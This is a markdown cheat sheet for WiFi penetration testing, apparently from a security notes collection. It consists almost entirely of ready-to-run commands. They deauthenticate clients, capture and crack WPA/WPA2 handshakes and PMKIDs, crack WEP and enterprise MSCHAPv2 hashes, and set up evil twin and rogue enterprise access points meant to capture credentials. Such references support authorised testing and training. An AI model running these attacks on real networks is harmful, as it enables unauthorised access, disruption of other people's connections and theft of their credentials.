---
tags:
  - Foundational
---

## WiFi Pentesting
resources: [HackTricks WiFi](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-wifi/), [Aircrack-ng Docs](https://www.aircrack-ng.org/doku.php)

> [!info] Enable monitor mode to capture wireless traffic and discover networks.

### Reconnaissance

#### Check Wireless Interfaces
```bash
iwconfig
ip link show
airmon-ng
```

#### Enable Monitor Mode
```bash
# Kill interfering processes
airmon-ng check kill

# Start monitor mode
airmon-ng start <Interface>

# Or manually
ip link set <Interface> down
iw <Interface> set monitor control
ip link set <Interface> up
```

#### Scan for Networks
```bash
# Passive scan with airodump-ng
airodump-ng <Interface>mon

# Target specific channel
airodump-ng -c <Channel> --bssid <BSSID> -w <OutputFile> <Interface>mon
```

#### Disable Monitor Mode [optional]
```bash
airmon-ng stop <Interface>mon
systemctl start NetworkManager
```

### WPA/WPA2 Attacks
> [!info] Capture 4-way handshake between AP and client, then crack offline.

#### Capture Handshake
```bash
# Start capture on target channel
airodump-ng -c <Channel> --bssid <BSSID> -w <Capture> <Interface>mon

# Deauth client to force reconnection (separate terminal)
aireplay-ng -0 5 -a <BSSID> -c <ClientMAC> <Interface>mon
```

#### Crack with Aircrack-ng
```bash
aircrack-ng -w <Wordlist> -b <BSSID> <Capture>.cap
```

#### Crack with Hashcat
```bash
# Convert cap to hashcat format
hcxpcapngtool -o <Output>.22000 <Capture>.cap

# Crack with hashcat
hashcat -m 22000 <Output>.22000 <Wordlist>
```

#### PMKID Attack (Clientless)
> [!tip] Capture PMKID from AP beacon without needing a client handshake using **hcxdumptool**.

```bash
# Using hcxdumptool
hcxdumptool -i <Interface>mon -o <Output>.pcapng --filterlist_ap=<BSSID> --filtermode=2 --enable_status=1

# Convert and crack
hcxpcapngtool -o <Output>.22000 <Output>.pcapng
hashcat -m 22000 <Output>.22000 <Wordlist>
```

### Evil Twin Attack
> [!danger] Create fake AP to intercept traffic or capture credentials.

#### Create Fake AP with hostapd
```bash
cat > /tmp/hostapd.conf << EOF
interface=<Interface>
driver=nl80211
ssid=<TargetSSID>
hw_mode=g
channel=<Channel>
wmm_enabled=0
macaddr_acl=0
auth_algs=1
wpa=2
wpa_passphrase=<Password>
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

hostapd /tmp/hostapd.conf
```

#### Automated with Wifiphisher [alternative]
```bash
wifiphisher -i <Interface> -e <TargetSSID>
```

### WPA-Enterprise Attacks
> [!info] Target enterprise networks using EAP authentication.

#### Rogue AP with hostapd-wpe
```bash
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

#### EAPHammer
```bash
eaphammer -i <Interface> --auth wpa-eap --essid <TargetSSID> --creds
```

#### Crack Captured MSCHAPv2
```bash
# hashcat for MSCHAPv2
hashcat -m 5500 <Hash> <Wordlist>

# asleap for LEAP
asleap -C <Challenge> -R <Response> -W <Wordlist>
```

### WEP Attacks [optional]
> [!warning] WEP is deprecated but still found in legacy environments.

#### WEP Cracking
```bash
# Capture IVs
airodump-ng -c <Channel> --bssid <BSSID> -w <Capture> <Interface>mon

# Generate traffic with ARP replay
aireplay-ng -3 -b <BSSID> -h <ClientMAC> <Interface>mon

# Crack when enough IVs captured (~20,000+)
aircrack-ng <Capture>.cap
```

### Automated Tools [optional]

#### Wifite
```bash
wifite --kill
```

#### Bettercap
```bash
bettercap -iface <Interface>mon
> wifi.recon on
> wifi.show
> wifi.deauth <BSSID>
```
